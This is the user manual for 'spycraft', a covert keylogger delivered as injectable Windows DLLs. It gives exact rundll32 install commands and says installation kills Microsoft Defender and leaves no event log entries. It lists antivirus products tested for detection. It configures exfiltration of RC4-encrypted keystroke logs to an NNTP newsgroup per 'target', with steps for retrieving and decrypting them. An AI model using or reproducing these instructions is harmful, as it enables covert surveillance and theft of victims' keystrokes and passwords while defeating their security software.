
A 32-bit DLL cannot be injected into a 64-bit process, and a 64-bit DLL cannot be injected into a 32-bit process.
DllMain is always the first thing called.

C:\Windows\System32\rundll32.exe is a 64-bit Executable.
C:\Windows\SysWOW64\rundll32.exe is a 32-bit Executable.

The two DLLs provided are:

xxx64R.dll  
This is a 64-bit DLL for 64-bit Windows only.


xxxR.dll 
This is a 32-bit DLL for both 32 and 64-bit Windows.


+++++ Debug Logging

Complete logging available in debug mode; Use spycraft.ini to specify location.

For obvious reasons creating a log file in release mode is not recommended, as it makes it easier to
find the covert nature of the tool.


+++++ How to install

Type all commands exactly as shown.

1- Install USB key.
2- Open a Admin-class command prompt.
3- Go directly into the folder where this application resides; a total of 3 files (2 DLLs and 1 INI file) reside there.
   Type [copy spycraft.ini %SystemRoot%\system32]
4- Type the right commands for the OS to copy and install spycraft.DLL (* details below).
6- A message will display indicating if it was, or was not, properly installed.

The File spycraft.ini must exist in the location of spycraft.dll.


On 64 bit Windows, the following commands must be run:

4a- [copy SpyCraft3264R.dll %SystemRoot%\system32] and
4b- [copy SpyCraft32R.dll   %SystemRoot%\system32] 
5-  [%SystemRoot%\System32\rundll32.exe %SystemRoot%\system32\SpyCraft3264R.dll,InstallMyself]


On 32 bit Windows, the following commands must be run:

4- [copy SpyCraft32R.dll %SystemRoot%\system32]
5- [%SystemRoot%\System32\rundll32.exe %SystemRoot%\system32\SpyCraft32R.dll,InstallMyself]


The only difference between Win32 and Win64 instructions is the DLL name used as the parameter.

(The 64-bit spycraft.DLL will properly write to the proper registry keys to install both 64, and 32-bit spycraft DLLs)


+++++ Are any Windows events log entries created as a result of installation or execution?

No

+++++ Windows Defender will prevent installation, how is this circumvented?

MS Defender is killed during the installation phase.
Subsequent reboots will not prevent spycraft from executing.

+++++ How can I configure settings?

spycraft.ini is used for configuration.
This file is read during installation, and during operation.
Entries must be shorter than 2048 bytes in length.

The only 4 mandatory entries are:
"NNTP"
"GROUP"
"OTP"
"SUBJECT"

All others are optional.
Configurable entries are shown in the following example 
(Do *not* use this as-is, this is an example, a default spycraft.ini is provided):

[spycraft]
NNTP=news.microsoft.com
GROUP=microsoft.public.nntp.test
OTP=A_very_very_Long_passphraseImpossible2Guess!
SUBJECT="This should be unique per target per operation"
DEBUGLOG=C:\temp\spycraft

[excluded]
csrss.exe
lsass.exe
winlogon.exe
wininit.exe
smss.exe
svchost.exe
explorer.exe
searchprotocolhost.exe
searchfilterhost.exe
sqlwriter.exe
sqlbrowser.exe
ipodservice.exe
lsm.exe
searchindexer.exe
spoolsv.exe
slsvc.exe
dwm.exe

[included]
DEBUGAPP=notepad.exe


+++++ What about other anti viruses, Won't they detect this?

I have tried with the following

- Defender (circumvented)
- Bit Defender (no detection)
- Panda Cloud AntiVirus
- Immunet protect
- Microsoft Security Essentials

If it is detected during the installation phase, simply perform the necessary steps to "Allow" spycraft and "Trust" it
using the appropriate UI.

+++++ What processes are excluded from 'injection'?

You can use the spycraft.ini file to modify entries, it does come with default entries deemed, unnecessary.
A maximum of 32000 characters can be specified.

+++++ What are the runtime dependencies?

shlwapi.dll (SHSetValueW)
rpcrt4.dll
secure32.dll (GetUserNameExA)
crypt32.dll  (CryptBinarytoStringA)
advapi32.dll

+++++ spycraft.ini description

[spycraft]
NNTP
This is the news server where the captured keystroke logs are uploaded.
Networking is done via the NTTP protocol, which is in cleartext, but the payload
is encrypted with the OTP entry you provide.
Mandatory.

GROUP
This is the group where the captured log is sent.
Be sure the target computer has access to the server, and the server is always available.
Mandatory.

OTP
This is the passphrase which will be used to encrypt the captured keystrokes from the target.
If you have multiple targets, use different passphrases for each.
Mandatory.

SUBJECT
This is the subject line that will be used for posting to the server.
Be sure to use a unique value which you can map the appropriate OTP for decryption in the future.
In addition, a unique value per target allows for easy setup of Google Alerts.
Mandatory.

DEBUGLOG
This is typically for debugging only, since this file will contain verbose information
about the state of the ongoing operations.
You should leave this blank when deploying, for obvious reasons.
The extension of .txt is automatically added, along with the date stamp.
Optional.

[excluded]
Enter filenames which you do not wish to 'inject' with spycraft.dll.
rundll32.exe is always excluded.
Be sure to use lower-case letters.
A maximum of 32000 characters total can be specified.
I recommend leaving the default values as-is.
Optional.

[included]
DEBUGAPP
Usually this is left blank, since an entry here indicates that you want *only* that file to be injected.
Typically used during development and debugging.
If there's an entry here, obviously [excluded] entries have no meaning.
Be sure to use lower-case letters.
Optional.

+++++ When is the data uploaded ?

If the captured buffer grows to 1024 bytes, a report is generated and an attempt is made to upload it.
When the injected process exits, a report is generated and an attempt is made to upload it.

+++++ How secure is the uploaded data?

It cannot be decrypted without the original one time pad.
If you lose the OTP you will never be able to recover the captured data.


+++++ What algorithm is used to encrypt?

RC4

+++++ What do the key codes map to?

See "key codes.txt" file for an explanation

+++++ How can I retrieve/decrypt the data?

Nothing could be easier.
First, locate your posting on the proper news server + news group.
Since you specify a unique subject line for each target, it should be very easy to locate.
Then, simply select the posting and paste into AgentTool.exe.
Be sure to add the proper passphrase which matches the one used when spycraft was installed, in AgentTool.exe.

+++++ The posting includes spycraft@superconfigure.com? Can I change that?

I don't see the point in doing so at this time.
No one will use that, except for spammers.
You are responsible to properly setup a valid server name, and to locate postings to the group you have specified in spycraft.ini.
No one else can read the posting, emails take no part in the process.


+++++ Can I be notified via email of a new Nntp posting by spycraft?

Yes! Google Alerts, works great.  Simply Make sure that:
a- The search term you specify matches the subject line you are using on a target.
b- You specify "Groups" as the type, and not "News".